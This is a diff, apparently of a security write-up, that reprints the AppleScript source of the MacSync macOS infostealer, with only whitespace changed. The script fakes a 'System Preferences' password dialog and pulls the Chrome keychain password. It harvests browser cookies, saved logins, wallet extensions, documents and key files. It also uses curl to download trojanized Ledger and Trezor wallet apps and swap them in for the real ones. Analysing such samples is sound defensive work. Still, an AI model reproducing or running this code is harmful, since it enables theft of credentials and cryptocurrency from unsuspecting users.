@@ -92,8 +92,8 @@ fi
 ## MacSync Infostealer Payload
 
 <details>
-  <summary>MacSync Infostealing script (click to expand)</summary>
-  <pre><code>
+ <summary>MacSync Infostealing script (click to expand)</summary>
+ <pre><code>
 on filesizer(paths)
 	set fsz to 0
 	try
@@ -214,30 +214,30 @@ on checkvalid(username, password_entered)
 end checkvalid
 
 on getpwd(username, writemind, provided_password)
-    try
-        if provided_password is not equal to "" then
-            if checkvalid(username, provided_password) then
-                writeText(provided_password, writemind & "Password")
-                return provided_password
-            end if
-        end if
-        if checkvalid(username, "") then
-            set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
-            writeText(result as string, writemind & "masterpass-chrome")
-            return ""
-        else
-            repeat
+ try
+ if provided_password is not equal to "" then
+ if checkvalid(username, provided_password) then
+ writeText(provided_password, writemind & "Password")
+ return provided_password
+ end if
+ end if
+ if checkvalid(username, "") then
+ set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
+ writeText(result as string, writemind & "masterpass-chrome")
+ return ""
+ else
+ repeat
 				set imagePath to "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/LockedIcon.icns" as POSIX file
-                set result to display dialog "Required Application Helper. Please enter password for continue." default answer "" with icon imagePath buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
-                set password_entered to text returned of result
-                if checkvalid(username, password_entered) then
-                    writeText(password_entered, writemind & "Password")
-                    return password_entered
-                end if
-            end repeat
-        end if
-    end try
-    return ""
+ set result to display dialog "Required Application Helper. Please enter password for continue." default answer "" with icon imagePath buttons {"Continue"} default button "Continue" giving up after 150 with title "System Preferences" with hidden answer
+ set password_entered to text returned of result
+ if checkvalid(username, password_entered) then
+ writeText(password_entered, writemind & "Password")
+ return password_entered
+ end if
+ end repeat
+ end if
+ end try
+ return ""
 end getpwd
 
 on grabPlugins(paths, savePath, pluginList, index)
@@ -259,28 +259,28 @@ on grabPlugins(paths, savePath, pluginList, index)
 end grabPlugins
 
 on Chromium(writemind, chromium_map)
-   	
+ 	
 	set pluginList to {}
-    set pluginList to pluginList & {"eiaeiblijfjekdanodkjadfinkhbfgcd", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"}
-    set pluginList to pluginList & {"bfogiafebfohielmmehodmfbbebbbpei", "nngceckbapebfimnlniiiahkandclblb"}
-    set pluginList to pluginList & {"fdjamakpfbbddfjaooikfcpapjohcfmg", "hdokiejnpimakedhajhdlcegeplioahd"}
-    set pluginList to pluginList & {"pnlccmojcmeohlpggmfnbbiapkmbliob", "ghmbeldphafepmbegfdlkpapadhbakde"}
-    set pluginList to pluginList & {"kmcfomidfpdkfieipokbalgegidffkal", "bnfdmghkeppfadphbnkjcicejfepnbfe"}
-    set pluginList to pluginList & {"caljgklbbfbcjjanaijlacgncafpegll", "folnjigffmbjmcjgmbbfcpleeddaedal"}
-    set pluginList to pluginList & {"igkpcodhieompeloncfnbekccinhapdb", "admmjipmmciaobhojoghlmleefbicajg"}
-    set pluginList to pluginList & {"ehpbfbahieociaeckccnklpdcmfaeegd", "epanfjkfahimkgomnigadpkobaefekcd"}
-    set pluginList to pluginList & {"didegimhafipceonhjepacocaffmoppf", "oboonakemofpalcgghocfoadofidjkkk"}
-    set pluginList to pluginList & {"jgnfghanfbjmimbdmnjfofnbcgpkbegj", "mmhlniccooihdimnnjhamobppdhaolme"}
-    set pluginList to pluginList & {"dbfoemgnkgieejfkaddieamagdfepnff", "bhghoamapcdpbohphigoooaddinpkbai"}
-    set pluginList to pluginList & {"nngceckbapebfimnlniiiahkandclblb", "lojeokmpinkpmpbakfkfpgfhpapbgdnd"}
-    set pluginList to pluginList & {"ibpjepoimpcdofeoalokgpjafnjonkpc", "gmohoglkppnemohbcgjakmgengkeaphi"}
-    set pluginList to pluginList & {"hdokiejnpimakedhajhdlcegeplioahd", "oboonakemofpalcgghocfoadofidjkkk"}
-    set pluginList to pluginList & {"dckgbiealcgdhgjofgcignfngijpbgba", "gmegpkknicehidppoebnmbhndjigpica"}
-    set pluginList to pluginList & {"eiokpeobbgpinbmcanngjjbklmhlepan", "odfkmgboddhcgopllebhkbjhokpojigd"}
-    set pluginList to pluginList & {"ppnbnpeolgkicgegkbkbjmhlideopiji", "cejfhijdfemlohmcjknpbeaohedoikpp"}
-    set pluginList to pluginList & {"nmhjblhloefhbhgbfkdgdpjabaocnhha", "iklgijhacenjgjgdnpnohbafpbmnccek"}
-    set pluginList to pluginList & {"ppkkcfblhfgmdmefkmkoomenhgecbemi", "lgndjfkadlbpaifdpbbobdodbaiaiakb"}
-    set pluginList to pluginList & {"bbphmbmmpomfelajledgdkgclfekilei", "bnfooenhhgcnhdkdjelgmmkpaemlnoek"}
+ set pluginList to pluginList & {"eiaeiblijfjekdanodkjadfinkhbfgcd", "aeblfdkhhhdcdjpifhhbdiojplfjncoa"}
+ set pluginList to pluginList & {"bfogiafebfohielmmehodmfbbebbbpei", "nngceckbapebfimnlniiiahkandclblb"}
+ set pluginList to pluginList & {"fdjamakpfbbddfjaooikfcpapjohcfmg", "hdokiejnpimakedhajhdlcegeplioahd"}
+ set pluginList to pluginList & {"pnlccmojcmeohlpggmfnbbiapkmbliob", "ghmbeldphafepmbegfdlkpapadhbakde"}
+ set pluginList to pluginList & {"kmcfomidfpdkfieipokbalgegidffkal", "bnfdmghkeppfadphbnkjcicejfepnbfe"}
+ set pluginList to pluginList & {"caljgklbbfbcjjanaijlacgncafpegll", "folnjigffmbjmcjgmbbfcpleeddaedal"}
+ set pluginList to pluginList & {"igkpcodhieompeloncfnbekccinhapdb", "admmjipmmciaobhojoghlmleefbicajg"}
+ set pluginList to pluginList & {"ehpbfbahieociaeckccnklpdcmfaeegd", "epanfjkfahimkgomnigadpkobaefekcd"}
+ set pluginList to pluginList & {"didegimhafipceonhjepacocaffmoppf", "oboonakemofpalcgghocfoadofidjkkk"}
+ set pluginList to pluginList & {"jgnfghanfbjmimbdmnjfofnbcgpkbegj", "mmhlniccooihdimnnjhamobppdhaolme"}
+ set pluginList to pluginList & {"dbfoemgnkgieejfkaddieamagdfepnff", "bhghoamapcdpbohphigoooaddinpkbai"}
+ set pluginList to pluginList & {"nngceckbapebfimnlniiiahkandclblb", "lojeokmpinkpmpbakfkfpgfhpapbgdnd"}
+ set pluginList to pluginList & {"ibpjepoimpcdofeoalokgpjafnjonkpc", "gmohoglkppnemohbcgjakmgengkeaphi"}
+ set pluginList to pluginList & {"hdokiejnpimakedhajhdlcegeplioahd", "oboonakemofpalcgghocfoadofidjkkk"}
+ set pluginList to pluginList & {"dckgbiealcgdhgjofgcignfngijpbgba", "gmegpkknicehidppoebnmbhndjigpica"}
+ set pluginList to pluginList & {"eiokpeobbgpinbmcanngjjbklmhlepan", "odfkmgboddhcgopllebhkbjhokpojigd"}
+ set pluginList to pluginList & {"ppnbnpeolgkicgegkbkbjmhlideopiji", "cejfhijdfemlohmcjknpbeaohedoikpp"}
+ set pluginList to pluginList & {"nmhjblhloefhbhgbfkdgdpjabaocnhha", "iklgijhacenjgjgdnpnohbafpbmnccek"}
+ set pluginList to pluginList & {"ppkkcfblhfgmdmefkmkoomenhgecbemi", "lgndjfkadlbpaifdpbbobdodbaiaiakb"}
+ set pluginList to pluginList & {"bbphmbmmpomfelajledgdkgclfekilei", "bnfooenhhgcnhdkdjelgmmkpaemlnoek"}
 
 	set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
 	repeat with chromium in chromium_map
@@ -311,7 +311,7 @@ on Chromium(writemind, chromium_map)
 end Chromium
 
 on ChromiumWallets(writemind, chromium_map)
-   	
+ 	
 	set pluginList to {}
 
 	set pluginList to pluginList & {"nkbihfbeogaeaoehlefnkodbefgpgknn", "bfnaelmomeimhlpmgjnjophhpkkoljpa"}
@@ -385,7 +385,7 @@ on Gecko(writemind, gecko_map)
 	set geckoFiles to {"/cert9.db", "/cookies.sqlite", "/cookies.sqlite-wal", "/formhistory.sqlite", "/key4.db", "/logins-backup.json", "/logins.json", "/signons.sqlite", "/places.sqlite"}
 	repeat with gecko in gecko_map
 		set savePath to writemind & "Browsers/" & item 1 of gecko & "_"
-        try
+ try
 			set fileList to list folder item 2 of gecko without invisibles
 			repeat with currentItem in fileList
 				if ((currentItem as string) contains "Profile") or ((currentItem as string) contains ".default") then
@@ -397,8 +397,8 @@ on Gecko(writemind, gecko_map)
 					end repeat
 				end if
 			end repeat
-        end try
-    end repeat
+ end try
+ end repeat
 end Gecko
 
 on Telegram(writemind, library)
@@ -435,17 +435,17 @@ end DesktopWallets
 
 on Filegrabber(writemind)
  try
-  set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
-  mkdir(destinationFolderPath)
-  set destinationSafariPath to POSIX file (writemind & "Safari/")
-  mkdir(destinationSafariPath)
-  set destinationNotesPath to POSIX file (writemind & "Notes/")
-  mkdir(destinationNotesPath)
-  set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
-  set bankSize to 0
-  set fileCounter to 1
-  
-  tell application "Finder"
+ set destinationFolderPath to POSIX file (writemind & "FileGrabber/")
+ mkdir(destinationFolderPath)
+ set destinationSafariPath to POSIX file (writemind & "Safari/")
+ mkdir(destinationSafariPath)
+ set destinationNotesPath to POSIX file (writemind & "Notes/")
+ mkdir(destinationNotesPath)
+ set extensionsList to {"pdf", "docx", "doc", "wallet", "key", "keys", "db", "txt", "seed", "rtf", "kdbx", "pem", "ovpn"}
+ set bankSize to 0
+ set fileCounter to 1
+ 
+ tell application "Finder"
 	try
 		duplicate file ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:Cookies.binarycookies") to folder (destinationSafariPath) with replacing
 	end try
@@ -487,7 +487,7 @@ on Filegrabber(writemind)
 		end if
 		end repeat
 	end try
-  end tell
+ end tell
  end try
 end Filegrabber
 
@@ -598,7 +598,7 @@ try
 	writeText("MacSync Stealer\n\n", writemind & "info")
 	writeText("Build Tag: s3\n", writemind & "info")
 	writeText("Version: 1.1.2_release (x64_86 & ARM)\n", writemind & "info")
-        writeText("IP: [REDACTED_IP]\n\n", writemind & "info")
+ writeText("IP: [REDACTED_IP]\n\n", writemind & "info")
 	writeText("Username: " & username, writemind & "info")
 	writeText("\nPassword: " & password_entered & "\n\n", writemind & "info")
 	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
@@ -638,38 +638,38 @@ set LEDGERDESTFILE0 to LEDGERDEST & "/Contents/Resources/app.asar"
 set LEDGERDESTFILE1 to LEDGERDEST & "/Contents/Info.plist"
 
 try
-    do shell script "test -d " & quoted form of LEDGERDEST
-    set ledger_installed to true
+ do shell script "test -d " & quoted form of LEDGERDEST
+ set ledger_installed to true
 on error
-    set ledger_installed to false
+ set ledger_installed to false
 end try
 
 if ledger_installed then
-    try
-        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
-        do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
-        set app_exists to false
+ try
+ do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of LEDGERURL & " -o " & quoted form of LEDGERDMGPATH
+ do shell script "unzip -q -o " & quoted form of LEDGERDMGPATH & " -d " & quoted form of LEDGERMOUNT
+ set app_exists to false
 		try
-            do shell script "test -e " & quoted form of LEDGERPATH0
-            set app_exists to true
+ do shell script "test -e " & quoted form of LEDGERPATH0
+ set app_exists to true
 		on error
 			set app_exists to false
-        end try
+ end try
 		try
-            do shell script "test -e " & quoted form of LEDGERPATH1
-            set app_exists to true
+ do shell script "test -e " & quoted form of LEDGERPATH1
+ set app_exists to true
 		on error
 			set app_exists to false
-        end try
+ end try
 		if app_exists then
 			do shell script "cp -rf " & quoted form of LEDGERDEST & " " & quoted form of LEDGERTMPDEST
 			do shell script "rm -rf " & quoted form of LEDGERDEST
 			do shell script "mv " & quoted form of LEDGERTMPDEST & " " & quoted form of LEDGERDEST
-            do shell script "mv " & quoted form of LEDGERPATH0 & " " & quoted form of LEDGERDESTFILE0
-            do shell script "mv " & quoted form of LEDGERPATH1 & " " & quoted form of LEDGERDESTFILE1
+ do shell script "mv " & quoted form of LEDGERPATH0 & " " & quoted form of LEDGERDESTFILE0
+ do shell script "mv " & quoted form of LEDGERPATH1 & " " & quoted form of LEDGERDESTFILE1
 			do shell script "codesign -f -d -s - " & quoted form of LEDGERDEST
-        end if
-    end try
+ end if
+ end try
 
 end if
 
@@ -682,37 +682,37 @@ set TREZORAPPFOLDER to "/Applications"
 set TREZORDEST to TREZORAPPFOLDER & "/" & TREZORNAME
 
 try
-    do shell script "test -d " & quoted form of TREZORDEST
-    set trezor_installed to true
+ do shell script "test -d " & quoted form of TREZORDEST
+ set trezor_installed to true
 on error
-    set trezor_installed to false
+ set trezor_installed to false
 end try
 
 if trezor_installed then
-    try
-        do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of TREZORURL & " -o " & quoted form of TREZORDMGPATH
-        do shell script "unzip -q -o " & quoted form of TREZORDMGPATH & " -d " & quoted form of TREZORMOUNT
-        set app_exists to false
-        try
-            do shell script "test -e " & quoted form of TREZORPATH
-            set app_exists to true
-        end try
-        
-        if app_exists then
-            try
-                do shell script "killall -9 'Trezor Suite'"
-            end try
-            do shell script "rm -rf " & quoted form of TREZORDEST
-            do shell script "cp -R " & quoted form of TREZORPATH & " " & quoted form of TREZORAPPFOLDER
-        end if
-    end try
+ try
+ do shell script "curl -k --user-agent 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36' -H 'api-key: 5190ef1733183a0dc63fb623357f56d6' -L " & quoted form of TREZORURL & " -o " & quoted form of TREZORDMGPATH
+ do shell script "unzip -q -o " & quoted form of TREZORDMGPATH & " -d " & quoted form of TREZORMOUNT
+ set app_exists to false
+ try
+ do shell script "test -e " & quoted form of TREZORPATH
+ set app_exists to true
+ end try
+ 
+ if app_exists then
+ try
+ do shell script "killall -9 'Trezor Suite'"
+ end try
+ do shell script "rm -rf " & quoted form of TREZORDEST
+ do shell script "cp -R " & quoted form of TREZORPATH & " " & quoted form of TREZORAPPFOLDER
+ end if
+ end try
 
-    try
-        do shell script "rm -rf " & quoted form of TREZORDMGPATH
-        do shell script "rm -rf " & quoted form of TREZORPATH
-    end try
+ try
+ do shell script "rm -rf " & quoted form of TREZORDMGPATH
+ do shell script "rm -rf " & quoted form of TREZORPATH
+ end try
 end if
-  </code></pre>
+ </code></pre>
 </details>
 
 Upon execution, the script prompts the user to enter their password, and will repeatedly ask until the correct password is entered, it will then save the password to disk.
